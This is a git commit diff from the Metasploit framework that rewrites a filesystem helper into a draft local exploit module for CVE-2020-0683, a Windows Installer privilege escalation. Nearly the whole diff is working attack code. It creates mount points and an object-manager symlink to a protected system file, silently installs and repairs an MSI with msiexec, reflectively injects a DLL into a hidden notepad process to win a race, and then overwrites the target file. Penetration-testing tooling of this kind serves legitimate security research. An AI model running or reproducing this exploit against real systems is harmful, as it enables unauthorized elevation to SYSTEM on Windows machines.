219125b3936ec37001bb84fd1be220986586f842
bwatters-r7 <bwatters@rapid7.com>
2020-04-29 10:35:43 -0500

    Credit cdelafuente-r7

--- lib/msf/core/post/windows/filesystem.rb
+++ lib/msf/core/post/windows/filesystem.rb
@@ -1,20 +1,60 @@
-# -*- coding: binary -*-
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
-require 'msf/core/exploit/windows_constants'
+require 'msf/core/post/common'
 require 'msf/core/post/windows'
-require 'msf/core/post/windows/error'
+require 'msf/core/exploit/windows_constants'
+require 'windows_error'
 
-module Msf
-class Post
-module Windows
+class MetasploitModule < Msf::Exploit::Local
+  Rank = NormalRanking
 
-module FileSystem
-  include Msf::Exploit::Windows_Constants
-  include Msf::Post::Windows::Error
   include Msf::Post::Common
+  include Msf::Post::Windows::Error
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::ReflectiveDLLInjection
+  include Msf::Exploit::Windows_Constants
+  include ::WindowsError
 
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Windows Installer Privilege Escalation',
+      'Description'    => %q(
+        TODO
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+                            'padovah4ck',             # discovery & PoC
+                            'Christophe De La fuente' # msf module
+                          ],
+      'References'     =>
+        [
+          [ 'CVE', '2020-0683'],
+          [ 'URL', 'https://github.com/padovah4ck/CVE-2020-0683']
+        ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Platform'       => 'win',
+      'Payload'        =>
+      {
+      },
+      'SessionTypes'   => [ 'meterpreter' ],
+      'Targets'        => [
+        [
+            'Windows x86', { 'Arch'  => ARCH_X86 }
+        ],
+        [
+            'Windows x64', { 'Arch'  => ARCH_X64 }
+        ]
+      ],
+      'DisclosureDate' => 'Feb 11 2020',
+      'DefaultTarget'  => 1
+    ))
 
-
+    # stores open handles to cleanup properly
+    @handles = []
+  end
 
   class String16 < BinData::String
     def assign(val)
@@ -216,6 +256,7 @@ module FileSystem
       return nil
     end
     vprint_good("Successfuly opened #{path}")
+    @handles << handle
     handle
   end
 
@@ -305,7 +346,8 @@ module FileSystem
       print_error("Something went wrong while creating the symlink. Return value: NTSTATUS #{error} ()")
       return nil
     end
-    result
+    @handles << result['LinkHandle']
+    result['return']
   ensure
     process.close
   end
@@ -322,6 +364,7 @@ module FileSystem
     buffer.reparse_data.substitute_name_length = target_byte_size
     buffer.reparse_data.print_name_offset = target_byte_size + 2
     buffer.reparse_data.path_buffer = target + "\0" + print_name + "\0"
+
     buffer
   end
 
@@ -336,7 +379,179 @@ module FileSystem
     set_reparse_point(handle, reparse_data.to_binary_s)
   end
 
-end # FileSystem
-end # Windows
-end # Post
-end # Msf
+
+
+
+  def setup_temp_dir(dir_path)
+    begin
+      session.fs.dir.rmdir(dir_path)
+    rescue Rex::Post::Meterpreter::RequestError
+    end
+    begin
+      session.fs.dir.mkdir(dir_path)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::Unknown, "Error when creating \"#{dir_path}\": #{e.message}")
+    end
+  end
+
+  def upload_msi(msi)
+    msi_path = ::File.join(Msf::Config.data_directory, 'post', 'msi', msi)
+    unless ::File.exist?(msi_path)
+      fail_with(Failure::Unknown, "MSI file #{msi_path} not found.")
+    end
+    tempdir = session.sys.config.getenv('TEMP')
+    # TODO: use random name
+    remote_msi = "#{tempdir}\\#{msi}"
+    print_status("Writing #{msi_path} to #{remote_msi}...")
+    session.fs.file.upload_file(remote_msi, msi_path)
+    print_good("#{remote_msi} written")
+    return remote_msi
+  rescue Rex::Post::Meterpreter::RequestError => e
+    fail_with(Failure::Unknown, "Error when uploading msi file: #{e.message}")
+  end
+
+  def exploit
+    if is_system?
+      fail_with(Failure::None, 'Session is already elevated')
+    end
+    if sysinfo['Architecture'] == ARCH_X64
+      if session.arch == ARCH_X86
+        fail_with(Failure::NoTarget, 'Running against WOW64 is not supported, please get an x64 session')
+      end
+
+      if target.arch.first == ARCH_X86
+        fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
+      end
+    end
+
+    #target_file = "C:\\Users\\n00tmeg\\target.txt"
+    target_file = "C:\\Windows\\win.ini"
+    # user_home -> C:\Users\[USER]
+    user_home = session.sys.config.getenv('USERPROFILE')
+    # user_home_path -> C:\Users\[USER]\foomsi
+    user_home_path = user_home + '\\foomsi'
+    # app_data_dir_path -> C:\Users\[USER]\AppData\Local\fakemsi
+    app_data_dir_path = user_home + '\\AppData\\Local\\fakemsi'
+    # app_data_file_path -> C:\Users\[USER]\AppData\Local\fakemsi\foo.txt
+    app_data_file_path = app_data_dir_path + '\\foo.txt'
+
+    print_status('Removing and creating temporary directory')
+    setup_temp_dir(user_home_path)
+    setup_temp_dir(app_data_dir_path)
+
+    print_status("Creating mountpoint from #{app_data_dir_path} to #{user_home_path}")
+    unless create_mount_point(app_data_dir_path, user_home_path)
+      fail_with(Failure::Unknown, "Error when creating the mount point... aborting.")
+    end
+
+    print_status("Creating symlink #{target_file} in \\RPC Control\\foo.txt")
+    unless create_symlink(nil, "\\RPC Control\\foo.txt", "\\??\\#{target_file}")
+      fail_with(Failure::Unknown, "Error when creating the symlink... aborting.")
+    end
+
+    msi = 'foo.msi'
+    print_status("Uploading #{msi}...")
+    remote_msi = upload_msi(msi)
+
+    msi_cmd = "msiexec /qn /x #{remote_msi}"
+    print_status("Removing MSI package on target: \"#{msi_cmd}\"")
+    cmd_exec(msi_cmd)
+
+    msi_cmd = "msiexec /qn /i #{remote_msi}"
+    print_status("Installing MSI package on target: \"#{msi_cmd}\"")
+    cmd_exec(msi_cmd)
+
+    print_status('Inject DLL to exploit the race condition...')
+
+    print_status('Launching notepad to host the exploit code...')
+    notepad_process = session.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
+    process = session.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+    if process
+      print_good("Process #{process.pid} launched.")
+    else
+      print_error('Operation failed. Using the current process instead')
+      process = session.sys.process.open
+    end
+
+    print_status("Reflectively injecting the DLL into process pid #{process.pid}...")
+    #library_path = ::File.join(Msf::Config.data_directory, 'post', 'msi', 'windows_installer_privesc.x64.dll')
+    library_path = ::File.join(Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2020-0683-windows_installer_privesc', 'x64', 'Release', 'windows_installer_privesc.dll')
+    exploit_mem, offset = inject_dll_into_process(process, library_path)
+    print_good("DLL injected." )
+    print_status("Injecting file path string into process pid #{process.pid}...")
+    enc_app_data_file_path = str_to_unicode(app_data_file_path)
+    payload_mem = inject_into_process(process, enc_app_data_file_path)
+    print_good('Payload injected.')
+
+    print_status("Executing exploit multiple times, until winning the race condition...")
+    msi_cmd = "msiexec /qn /fa #{remote_msi}"
+    10.times do |i|
+      print_status("##{i}")
+      # Invoke the file monitoring code, passing in the address of the file path string
+      thread = process.thread.create(exploit_mem + offset, payload_mem)
+      vprint_status("Thread tid=\"#{thread.tid}\" created")
+      vprint_status("Force reinstalling MSI package: \"#{msi_cmd}\"")
+      cmd_exec(msi_cmd)
+      begin
+        session.fs.file.open(target_file, 'wb') do |fd|
+          fd.write("Yeet!!")
+        end
+        print_good('Success!!')
+        break
+      rescue Rex::Post::Meterpreter::RequestError => e
+        vprint_error("Error when attempting to write the target file #{target_file}: #{e.message}")
+        sleep 1
+      end
+    ensure
+      thread.terminate(0) if process.thread.get_threads.include?(thread.tid)
+      thread.close
+      vprint_status("Recreating mountpoint from #{app_data_dir_path} to #{user_home_path}")
+      unless create_mount_point(app_data_dir_path, user_home_path)
+        fail_with(Failure::Unknown, "Error when creating the mount point... aborting.")
+      end
+    end
+
+  ensure
+    print_status("Cleanup...")
+    vprint_status("Remove #{remote_msi}")
+    begin
+      session.fs.file.rm(remote_msi)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("Error while removing #{remote_msi}: #{e.message}")
+    end
+
+    if notepad_process
+      print_status("Kill notepad (pid=#{notepad_process.pid}) and close handles")
+      begin
+        session.sys.process.kill(notepad_process.pid)
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_error("Error while killing notepad: #{e.message}")
+      end
+      notepad_process.close
+    end
+    process.close if process
+
+    print_status("Delete mountpoint #{app_data_dir_path}")
+    unless delete_mount_point(app_data_dir_path)
+      print_error("Error when deleting the mount point.")
+    end
+    begin
+      session.fs.dir.rmdir(app_data_dir_path)
+    rescue Rex::Post::Meterpreter::RequestError
+      print_error("Error when deleting \"#{app_data_dir_path}\".")
+    end
+    begin
+      session.fs.dir.rmdir(user_home_path)
+    rescue Rex::Post::Meterpreter::RequestError
+      print_error("Error when deleting \"#{user_home_path}\".")
+    end
+
+    @handles.each do |handle|
+      vprint_status("Close handle #{handle}")
+      session.railgun.kernel32.CloseHandle(handle)
+    end
+
+    print_good("Done!")
+  end
+
+end
